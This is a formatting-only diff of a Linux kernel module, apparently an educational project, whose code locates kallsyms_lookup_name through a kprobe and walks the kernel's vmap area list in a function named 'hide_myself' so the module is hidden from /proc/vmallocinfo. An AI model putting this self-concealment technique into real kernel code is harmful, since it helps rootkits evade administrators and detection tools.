@@ -4,11 +4,11 @@
 #include <linux/vmalloc.h>
 
 #include <linux/version.h>
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 7, 0)
 #define KPROBE_LOOKUP 1
 #include <linux/kprobes.h>
 static struct kprobe kp = {
-	.symbol_name = "kallsyms_lookup_name",
+    .symbol_name = "kallsyms_lookup_name",
 };
 #endif
 
@@ -28,15 +28,14 @@ static void __init hide_myself(void)
     int ret;
     ret = register_kprobe(&kp);
     if (ret < 0)
-	    return ret;
-    kallsyms_lookup_name = ( unsigned long(*)(const char *name) )kp.addr;
+        return ret;
+    kallsyms_lookup_name = (unsigned long (*)(const char *name)) kp.addr;
     unregister_kprobe(&kp);
-#endif    
+#endif
 
     _vmap_area_list =
         (struct list_head *) kallsyms_lookup_name("vmap_area_list");
-    _vmap_area_root =
-        (struct rb_root *) kallsyms_lookup_name("vmap_area_root");
+    _vmap_area_root = (struct rb_root *) kallsyms_lookup_name("vmap_area_root");
 
     /* hidden from /proc/vmallocinfo */
     list_for_each_entry_safe (va, vtmp, _vmap_area_list, list) {
